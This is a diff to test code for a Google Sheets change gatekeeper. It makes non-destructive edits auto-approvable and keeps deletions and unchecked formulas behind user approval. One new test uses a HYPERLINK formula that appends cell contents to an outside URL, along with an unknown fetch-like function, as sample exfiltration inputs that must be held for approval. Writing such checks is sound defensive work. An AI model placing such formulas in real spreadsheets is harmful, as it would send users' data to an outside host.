@@ -46,10 +46,16 @@ const MAX_SHEET_ID = 2 ** 31 - 1;
 const CHANGED = "This change no longer applies: cells it overwrites or deletes, or a sheet it changes, " +
   "changed since it was queued.";
 
+const EDIT_SPREADSHEET = { tag: "edit-spreadsheet", label: "Spreadsheet edits that keep every sheet, row and column" };
+/** The kind of every change a user cannot let apply without asking. */
+const UPDATE_SPREADSHEET = {
+  tag: "update-spreadsheet", label: "Spreadsheet changes that delete or run unchecked formulas",
+};
 /** The kinds of change a user may let apply without asking. */
 const AUTO_APPROVABLE = [
   { tag: "editSheetValues", label: "Sheet value edits" },
   { tag: "formatSheets", label: "Sheet formatting" },
+  EDIT_SPREADSHEET,
 ];
 
 /** Fields of a cell's value, which no format read may ask for. */
@@ -907,7 +913,7 @@ describe("Google Sheets changes", () => {
     expect(provider.get("Sales!A3")).toBe("APAC");
   });
 
-  it("queues a batch with a formula for approval, written as Google stores it", async () => {
+  it("queues a batch with a spreadsheet-only formula as an auto-approvable edit, written as Google stores it", async () => {
     let provider = budget();
     let sheets = gatekeeper();
 
@@ -918,7 +924,8 @@ describe("Google Sheets changes", () => {
 
     expect(action).toMatchObject({
       title: "Edit 2 sheets",
-      autoApprovable: false,
+      autoApprovable: true,
+      actionKind: EDIT_SPREADSHEET,
       fields: [
         { label: "Change 1: Values", kind: "text", value: '["=sum(Sales!B2:C2)"]\n[null]' },
         { label: "Change 1: Formulas", kind: "text", value: "D2: =sum(Sales!B2:C2)" },
@@ -948,6 +955,16 @@ describe("Google Sheets changes", () => {
       },
     ]);
     expect(provider.get("Sales!D2")).toEqual({ formula: "=sum(Sales!B2:C2)" });
+  });
+
+  it("queues a formula calling a function it does not know, which may wrap a fetch, for approval", async () => {
+    budget();
+    let sheets = gatekeeper();
+
+    for (let formula of ["=MYFETCH(B2)", '=HYPERLINK("https://example.com/?" & B2)']) {
+      let { action } = await sheets.queued([{ op: "writeCells", range: "Sales!D2", values: [[formula]] }]);
+      expect(action, formula).toMatchObject({ autoApprovable: false, actionKind: UPDATE_SPREADSHEET });
+    }
   });
 
   it("names a sheet exactly when the description cannot, and quotes a formula with a line break", async () => {
@@ -1472,7 +1489,7 @@ describe("Google Sheets changes to rows, columns and sheets", () => {
     ]);
 
     expect(value).toBeUndefined();
-    expect(action).toMatchObject({ title: 'Edit "Sales"', autoApprovable: false });
+    expect(action).toMatchObject({ title: 'Edit "Sales"', autoApprovable: true, actionKind: EDIT_SPREADSHEET });
     expect(action!.description).toContain(
       "Makes 2 changes, all or none of which are applied:\n\n" +
       '1. In "Sales", insert 2 rows before row 3\n' +
@@ -1609,7 +1626,7 @@ describe("Google Sheets changes to rows, columns and sheets", () => {
     ]);
 
     expect(value).toBeUndefined();
-    expect(action).toMatchObject({ title: 'Edit "Q4"', autoApprovable: false });
+    expect(action).toMatchObject({ title: 'Edit "Q4"', autoApprovable: true, actionKind: EDIT_SPREADSHEET });
     expect(action!.description).toContain(
       '1. Add a sheet "Q4" of 1,000 rows and 26 columns at position 3\n' +
       '2. In "Q4", set A1 to the values below\n' +
@@ -1704,7 +1721,7 @@ describe("Google Sheets changes to rows, columns and sheets", () => {
     ]);
 
     // Q4, It's, Sales and the copy of Sales.
-    expect(action).toMatchObject({ title: "Edit 4 sheets", autoApprovable: false });
+    expect(action).toMatchObject({ title: "Edit 4 sheets", autoApprovable: false, actionKind: UPDATE_SPREADSHEET });
     expect(action!.description).toContain(
       "Makes 12 changes, all or none of which are applied:\n\n" +
       '1. Add a sheet "Q4" of 5 rows and 3 columns at position 3\n' +
@@ -1766,6 +1783,7 @@ describe("Google Sheets changes to rows, columns and sheets", () => {
       title: 'Edit "Q3 Plan"',
       description: 'Delete the sheet "Q3 Plan" (10 rows, 4 columns) and everything on it.',
       autoApprovable: false,
+      actionKind: UPDATE_SPREADSHEET,
     });
     expect((await sheets.info()).sheets.map(s => s.title)).toEqual(["Sales"]);
 
@@ -2087,7 +2105,7 @@ describe("Google Sheets formatting", () => {
     expect(await sheets.formats("Sales!A1:D4")).toEqual(around);
   });
 
-  it("queues formatting with any other change for approval, and names each sheet a formatting batch formats", async () => {
+  it("queues formatting with other changes as an edit, and names each sheet a formatting batch formats", async () => {
     budget();
     let sheets = gatekeeper();
 
@@ -2095,8 +2113,7 @@ describe("Google Sheets formatting", () => {
       { op: "writeCells", range: "Sales!A5", values: [["x"]] },
       { op: "formatCells", range: "Sales!A5", format: { italic: true, verticalAlignment: "MIDDLE" } },
     ]);
-    expect(mixed.action).toMatchObject({ title: 'Edit "Sales"', autoApprovable: false });
-    expect(mixed.action!.actionKind).toBeUndefined();
+    expect(mixed.action).toMatchObject({ title: 'Edit "Sales"', autoApprovable: true, actionKind: EDIT_SPREADSHEET });
     expect(mixed.action!.description).toContain(
       "Makes 2 changes, all or none of which are applied:\n\n" +
       '1. In "Sales", set A5 to the values below\n' +
